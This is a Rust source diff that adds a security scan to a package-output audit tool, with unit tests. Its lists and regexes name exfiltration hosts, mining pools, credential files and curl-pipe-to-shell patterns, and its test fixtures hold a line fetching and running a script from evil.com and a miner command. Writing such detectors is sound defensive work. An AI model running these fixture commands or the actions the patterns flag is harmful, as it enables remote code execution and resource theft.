@@ -851,6 +851,458 @@ async fn check_metadata(eval_entry_point: &str, attr_path: &str) -> Vec<AuditFin
 }
 
 // ---------------------------------------------------------------------------
+// Category 7: Security Issues
+// ---------------------------------------------------------------------------
+
+/// Suspicious dotfile names that should not appear in package outputs
+const SUSPICIOUS_DOTFILES: &[&str] = &[
+    ".env",
+    ".git",
+    ".gitconfig",
+    ".npmrc",
+    ".pypirc",
+    ".ssh",
+    ".netrc",
+    ".docker",
+    ".aws",
+    ".gnupg",
+    ".pgpass",
+];
+
+/// Suspicious pastebin / tunnel / exfil hostnames
+const SUSPICIOUS_HOSTS: &[&str] = &[
+    "pastebin.com",
+    "paste.ee",
+    "hastebin.com",
+    "transfer.sh",
+    "ngrok.io",
+    "ngrok.app",
+    "serveo.net",
+    "localtunnel.me",
+    "webhook.site",
+    "requestbin.com",
+    "pipedream.net",
+    "burpcollaborator.net",
+    "interact.sh",
+    "oast.fun",
+];
+
+/// Known crypto-mining pool hostnames / identifiers
+const MINER_INDICATORS: &[&str] = &[
+    "stratum+tcp://",
+    "stratum+ssl://",
+    "xmrig",
+    "minerd",
+    "minergate",
+    "nanopool.org",
+    "supportxmr.com",
+    "hashvault.pro",
+    "moneroocean.stream",
+    "herominers.com",
+    "2miners.com",
+    "f2pool.com",
+    "ethermine.org",
+    "unmineable.com",
+    "nicehash.com",
+    "coinhive",
+];
+
+/// Calculate Shannon entropy of a byte string (bits per byte)
+fn shannon_entropy(data: &[u8]) -> f64 {
+    if data.is_empty() {
+        return 0.0;
+    }
+    let mut freq = [0u64; 256];
+    for &b in data {
+        freq[b as usize] += 1;
+    }
+    let len = data.len() as f64;
+    freq.iter()
+        .filter(|&&c| c > 0)
+        .map(|&c| {
+            let p = c as f64 / len;
+            -p * p.log2()
+        })
+        .sum()
+}
+
+/// Run all security checks on a single output tree
+fn check_security_issues(output_name: &str, output_path: &Path) -> Vec<AuditFinding> {
+    let mut findings = Vec::new();
+
+    // Pre-compile regexes once for all files
+    let credential_patterns = [
+        (r"AKIA[0-9A-Z]{16}", "AWS access key"),
+        (r"ghp_[a-zA-Z0-9]{36}", "GitHub personal access token"),
+        (r"glpat-[a-zA-Z0-9\-_]{20,}", "GitLab personal access token"),
+        (r"sk-[a-zA-Z0-9]{20,}", "Secret key (OpenAI/Stripe-style)"),
+        (r#"(?i)password\s*=\s*"[^"]{8,}""#, "Hardcoded password"),
+        (
+            r#"(?i)(?:api_?key|secret_?key|auth_?token)\s*=\s*"[^"]{8,}""#,
+            "Hardcoded API key/secret",
+        ),
+    ];
+
+    let compiled_creds: Vec<(Regex, &str)> = credential_patterns
+        .iter()
+        .filter_map(|(pattern, label)| Regex::new(pattern).ok().map(|re| (re, *label)))
+        .collect();
+
+    let suspicious_url_re = Regex::new(r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[/:\s]").ok();
+    let http_fetch_re = Regex::new(r"http://[a-zA-Z0-9]").ok();
+
+    let shell_download_re = Regex::new(
+        r"(?:curl|wget)\s+[^\n|]*\|\s*(?:ba)?sh|bash\s+<\(curl|curl\s+[^\n]*-o[^\n]*&&[^\n]*chmod\s+\+x",
+    )
+    .ok();
+
+    let eval_remote_re = Regex::new(
+        r#"eval\s+"\$\((?:curl|wget)|python[23]?\s+-c\s+"\$\((?:curl|wget)|(?:curl|wget)\s+[^\n|]*\|\s*(?:python|ruby|perl|node)"#,
+    )
+    .ok();
+
+    let exfil_read_re = Regex::new(
+        r"(?:/etc/passwd|/etc/shadow|~/\.ssh|\.ssh/id_|\.gnupg|\.aws/credentials|\.netrc)",
+    )
+    .ok();
+    let exfil_send_re = Regex::new(r"(?:curl|wget|nc|ncat)\s").ok();
+
+    // Extensions to skip (binary/compressed formats)
+    let skip_extensions: HashSet<&str> = [
+        "png", "jpg", "jpeg", "gif", "bmp", "ico", "svg", "webp", "gz", "xz", "bz2", "zst", "zip",
+        "tar", "7z", "rar", "woff", "woff2", "ttf", "otf", "eot", "pyc", "pyo", "class", "o", "a",
+        "so", "dylib",
+    ]
+    .into_iter()
+    .collect();
+
+    let script_extensions: HashSet<&str> = [
+        "sh", "bash", "py", "pl", "rb", "lua", "fish", "zsh", "csh", "js", "mjs", "ts",
+    ]
+    .into_iter()
+    .collect();
+
+    // Directories where ELF binaries are expected
+    let binary_dirs: HashSet<&str> = ["bin", "sbin", "libexec", "lib", "lib64"]
+        .into_iter()
+        .collect();
+
+    for entry in WalkDir::new(output_path).follow_links(true) {
+        let Ok(entry) = entry else { continue };
+        let path = entry.path();
+        let Ok(metadata) = entry.metadata() else {
+            continue;
+        };
+        let relative = path.strip_prefix(output_path).unwrap_or(path);
+
+        // --- Permission-based checks (all files) ---
+
+        if metadata.is_file() {
+            let mode = metadata.permissions().mode();
+
+            // world-writable
+            if mode & 0o002 != 0 {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "world_writable_file".to_owned(),
+                    message: "File is world-writable".to_owned(),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: Some(format!("mode: {mode:#o}")),
+                });
+            }
+        }
+
+        // --- Filename-based checks ---
+
+        if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
+            // Hidden/sensitive dotfiles
+            if SUSPICIOUS_DOTFILES.contains(&name) {
+                findings.push(AuditFinding {
+                    severity: Severity::Info,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "hidden_files_in_output".to_owned(),
+                    message: format!("Sensitive dotfile in output: {name}"),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+            }
+        }
+
+        // Suspicious binary in non-binary directory
+        if metadata.is_file() {
+            let top_dir = relative
+                .components()
+                .next()
+                .and_then(|c| c.as_os_str().to_str())
+                .unwrap_or("");
+
+            if !binary_dirs.contains(top_dir) && is_elf(path) {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "suspicious_binary_in_share".to_owned(),
+                    message: format!("ELF binary in unexpected location: {top_dir}/"),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+            }
+        }
+
+        // --- Content-scanning checks (text/script files only) ---
+
+        if !metadata.is_file() {
+            continue;
+        }
+
+        // Skip large files and binary extensions
+        if metadata.len() > 1024 * 1024 {
+            continue;
+        }
+        if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
+            if skip_extensions.contains(ext.to_lowercase().as_str()) {
+                continue;
+            }
+        }
+
+        // Determine if this is a script-like file (for content checks)
+        let is_script = path
+            .extension()
+            .and_then(|e| e.to_str())
+            .is_some_and(|ext| script_extensions.contains(ext))
+            || std::fs::File::open(path)
+                .and_then(|mut f| {
+                    let mut magic = [0u8; 2];
+                    f.read_exact(&mut magic)?;
+                    Ok(magic == [b'#', b'!'])
+                })
+                .unwrap_or(false);
+
+        if !is_script {
+            // For non-scripts, only check credentials in config-like files
+            let is_config = path
+                .extension()
+                .and_then(|e| e.to_str())
+                .is_some_and(|ext| {
+                    matches!(
+                        ext,
+                        "conf" | "cfg" | "ini" | "toml" | "yaml" | "yml" | "json" | "xml" | "env"
+                    )
+                });
+            if !is_config {
+                continue;
+            }
+        }
+
+        // Read file content (first 16KB for scripts, 8KB for configs)
+        let read_limit = if is_script { 16384 } else { 8192 };
+        let mut buf = vec![0u8; read_limit];
+        let Ok(bytes_read) = std::fs::File::open(path).and_then(|mut f| f.read(&mut buf)) else {
+            continue;
+        };
+        buf.truncate(bytes_read);
+        let content = String::from_utf8_lossy(&buf);
+
+        // -- Embedded credentials --
+        for (re, label) in &compiled_creds {
+            if let Some(mat) = re.find(&content) {
+                // Truncate the matched value to avoid leaking it
+                let matched = mat.as_str();
+                let preview = if matched.len() > 20 {
+                    format!("{}...", &matched[..20])
+                } else {
+                    matched.to_owned()
+                };
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "embedded_credentials".to_owned(),
+                    message: format!("Possible {label} found"),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: Some(format!("match: {preview}")),
+                });
+                break; // one finding per file for credentials
+            }
+        }
+
+        // Remaining checks only for scripts
+        if !is_script {
+            continue;
+        }
+
+        // -- Suspicious network URLs --
+        let mut found_suspicious_url = false;
+        for host in SUSPICIOUS_HOSTS {
+            if content.contains(host) {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "suspicious_network_in_output".to_owned(),
+                    message: format!("Reference to suspicious host: {host}"),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+                found_suspicious_url = true;
+                break; // one finding per file
+            }
+        }
+        if !found_suspicious_url {
+            if let Some(ref re) = suspicious_url_re {
+                if let Some(mat) = re.find(&content) {
+                    findings.push(AuditFinding {
+                        severity: Severity::Warning,
+                        category: CheckCategory::SecurityIssues,
+                        check_name: "suspicious_network_in_output".to_owned(),
+                        message: "URL with IP address literal".to_owned(),
+                        output_name: output_name.to_owned(),
+                        file_path: to_utf8(relative),
+                        details: Some(mat.as_str().trim().to_owned()),
+                    });
+                }
+            }
+            if let Some(ref re) = http_fetch_re {
+                if re.is_match(&content) {
+                    // Skip common acceptable http URLs (localhost, example.com, schemas)
+                    let dominated_by_safe = content.contains("http://localhost")
+                        || content.contains("http://127.0.0.1")
+                        || content.contains("http://[::1]")
+                        || content.contains("http://example")
+                        || content.contains("http://www.w3.org")
+                        || content.contains("http://www.freedesktop.org")
+                        || content.contains("http://www.gnu.org");
+                    if !dominated_by_safe {
+                        findings.push(AuditFinding {
+                            severity: Severity::Info,
+                            category: CheckCategory::SecurityIssues,
+                            check_name: "suspicious_network_in_output".to_owned(),
+                            message: "Script contains non-HTTPS URL".to_owned(),
+                            output_name: output_name.to_owned(),
+                            file_path: to_utf8(relative),
+                            details: None,
+                        });
+                    }
+                }
+            }
+        }
+
+        // -- Shell download-and-execute pattern --
+        if let Some(ref re) = shell_download_re {
+            if re.is_match(&content) {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "shell_download_pattern".to_owned(),
+                    message: "Download-and-execute pattern detected (curl|sh or similar)"
+                        .to_owned(),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+            }
+        }
+
+        // -- Crypto miner indicators --
+        for indicator in MINER_INDICATORS {
+            let indicator_lower = indicator.to_lowercase();
+            if content.to_ascii_lowercase().contains(&indicator_lower) {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "crypto_miner_indicators".to_owned(),
+                    message: format!("Crypto mining indicator: {indicator}"),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+                break; // one finding per file
+            }
+        }
+
+        // -- Data exfiltration pattern --
+        if let (Some(ref read_re), Some(ref send_re)) = (&exfil_read_re, &exfil_send_re) {
+            if read_re.is_match(&content) && send_re.is_match(&content) {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "data_exfiltration_pattern".to_owned(),
+                    message: "Script reads sensitive files and has network send capability"
+                        .to_owned(),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+            }
+        }
+
+        // -- Eval of remote content --
+        if let Some(ref re) = eval_remote_re {
+            if re.is_match(&content) {
+                findings.push(AuditFinding {
+                    severity: Severity::Warning,
+                    category: CheckCategory::SecurityIssues,
+                    check_name: "eval_of_remote_content".to_owned(),
+                    message: "Dynamic code execution of fetched content".to_owned(),
+                    output_name: output_name.to_owned(),
+                    file_path: to_utf8(relative),
+                    details: None,
+                });
+            }
+        }
+
+        // -- High entropy strings (potential obfuscated payloads/secrets) --
+        for line in content.lines() {
+            let trimmed = line.trim();
+            // Skip comments
+            if trimmed.starts_with('#') || trimmed.starts_with("//") {
+                continue;
+            }
+            for token in trimmed.split(|c: char| c.is_whitespace() || c == '"' || c == '\'') {
+                if token.len() >= 40 && token.is_ascii() {
+                    let entropy = shannon_entropy(token.as_bytes());
+                    if entropy > 4.5 {
+                        // Exclude common high-entropy but benign patterns:
+                        // nix store paths/hashes, SRI hashes, hex-only strings (checksums)
+                        let looks_like_hash = token.starts_with("/nix/store/")
+                            || token.contains("/nix/store/")
+                            || token.starts_with("sha256-")
+                            || token.starts_with("sha512-")
+                            || token.starts_with("sha1-")
+                            || token
+                                .bytes()
+                                .all(|b| b.is_ascii_hexdigit());
+                        if !looks_like_hash {
+                            let preview = if token.len() > 40 {
+                                format!("{}...", &token[..40])
+                            } else {
+                                token.to_owned()
+                            };
+                            findings.push(AuditFinding {
+                                severity: Severity::Info,
+                                category: CheckCategory::SecurityIssues,
+                                check_name: "high_entropy_strings".to_owned(),
+                                message: "High-entropy string (possible secret or obfuscated code)"
+                                    .to_owned(),
+                                output_name: output_name.to_owned(),
+                                file_path: to_utf8(relative),
+                                details: Some(format!("entropy: {entropy:.2}, value: {preview}")),
+                            });
+                            break; // one finding per file
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    findings
+}
+
+// ---------------------------------------------------------------------------
 // Orchestrator
 // ---------------------------------------------------------------------------
 
@@ -906,6 +1358,11 @@ pub async fn run_audit(
             checks_run += 1;
             findings.extend(check_pkg_config(output_name, output_path));
         }
+
+        if config.check_security {
+            checks_run += 1;
+            findings.extend(check_security_issues(output_name, output_path));
+        }
     }
 
     // Metadata checks (need eval context)
@@ -946,5 +1403,166 @@ mod tests {
     fn test_to_utf8() {
         let p = Path::new("bin/hello");
         assert_eq!(to_utf8(p), Some(Utf8PathBuf::from("bin/hello")));
+    }
+
+    #[test]
+    fn test_shannon_entropy_low() {
+        // Repeated single character = zero entropy
+        let data = b"aaaaaaaaaa";
+        assert!(shannon_entropy(data) < 0.01);
+    }
+
+    #[test]
+    fn test_shannon_entropy_high() {
+        // Random-looking base64 string
+        let data = b"aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2u";
+        let entropy = shannon_entropy(data);
+        assert!(entropy > 4.0, "Expected high entropy, got {entropy}");
+    }
+
+    #[test]
+    fn test_shannon_entropy_empty() {
+        assert!((shannon_entropy(b"") - 0.0).abs() < f64::EPSILON);
+    }
+
+    #[test]
+    fn test_security_world_writable() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let file_path = dir.path().join("share").join("data.txt");
+        std::fs::create_dir_all(file_path.parent().unwrap()).unwrap();
+        std::fs::write(&file_path, b"hello").unwrap();
+        std::fs::set_permissions(&file_path, std::fs::Permissions::from_mode(0o666)).unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        let ww_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.check_name == "world_writable_file")
+            .collect();
+        assert!(!ww_findings.is_empty(), "Expected world-writable finding");
+    }
+
+    #[test]
+    fn test_security_hidden_dotfile() {
+        let dir = tempfile::tempdir().unwrap();
+        let env_path = dir.path().join("share").join(".env");
+        std::fs::create_dir_all(env_path.parent().unwrap()).unwrap();
+        std::fs::write(&env_path, b"SECRET=foo").unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        let dot_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.check_name == "hidden_files_in_output")
+            .collect();
+        assert!(!dot_findings.is_empty(), "Expected hidden dotfile finding");
+    }
+
+    #[test]
+    fn test_security_shell_download_pattern() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let script = dir.path().join("bin").join("setup.sh");
+        std::fs::create_dir_all(script.parent().unwrap()).unwrap();
+        std::fs::write(
+            &script,
+            b"#!/bin/sh\ncurl http://evil.com/install.sh | sh\n",
+        )
+        .unwrap();
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        let dl_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.check_name == "shell_download_pattern")
+            .collect();
+        assert!(
+            !dl_findings.is_empty(),
+            "Expected shell download pattern finding"
+        );
+    }
+
+    #[test]
+    fn test_security_embedded_credentials() {
+        let dir = tempfile::tempdir().unwrap();
+        let conf = dir.path().join("etc").join("app.conf");
+        std::fs::create_dir_all(conf.parent().unwrap()).unwrap();
+        std::fs::write(&conf, b"aws_key = AKIAIOSFODNN7EXAMPLE\n").unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        let cred_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.check_name == "embedded_credentials")
+            .collect();
+        assert!(
+            !cred_findings.is_empty(),
+            "Expected embedded credentials finding"
+        );
+    }
+
+    #[test]
+    fn test_security_crypto_miner() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let script = dir.path().join("bin").join("run.sh");
+        std::fs::create_dir_all(script.parent().unwrap()).unwrap();
+        std::fs::write(
+            &script,
+            b"#!/bin/sh\n./miner stratum+tcp://pool.example.com:3333\n",
+        )
+        .unwrap();
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        let miner_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.check_name == "crypto_miner_indicators")
+            .collect();
+        assert!(!miner_findings.is_empty(), "Expected crypto miner finding");
+    }
+
+    #[test]
+    fn test_security_clean_output_no_findings() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let script = dir.path().join("bin").join("hello");
+        std::fs::create_dir_all(script.parent().unwrap()).unwrap();
+        std::fs::write(&script, b"#!/bin/sh\necho hello world\n").unwrap();
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        assert!(
+            findings.is_empty(),
+            "Expected no findings for clean output, got: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn test_security_nix_store_paths_not_flagged_as_high_entropy() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::tempdir().unwrap();
+        let script = dir.path().join("bin").join("wrapper.sh");
+        std::fs::create_dir_all(script.parent().unwrap()).unwrap();
+        // Script containing nix store paths with 32-char hashes
+        std::fs::write(
+            &script,
+            b"#!/bin/sh\nexec /nix/store/aaaaaabbbbbbccccccddddddeeeeeeee-pkg-1.0/bin/hello \"$@\"\nPATH=/nix/store/1234567890abcdef1234567890abcdef-coreutils-9.4/bin:$PATH\n",
+        )
+        .unwrap();
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+        let findings = check_security_issues("out", dir.path());
+        let entropy_findings: Vec<_> = findings
+            .iter()
+            .filter(|f| f.check_name == "high_entropy_strings")
+            .collect();
+        assert!(
+            entropy_findings.is_empty(),
+            "Nix store paths should not trigger high-entropy check, got: {entropy_findings:?}"
+        );
     }
 }
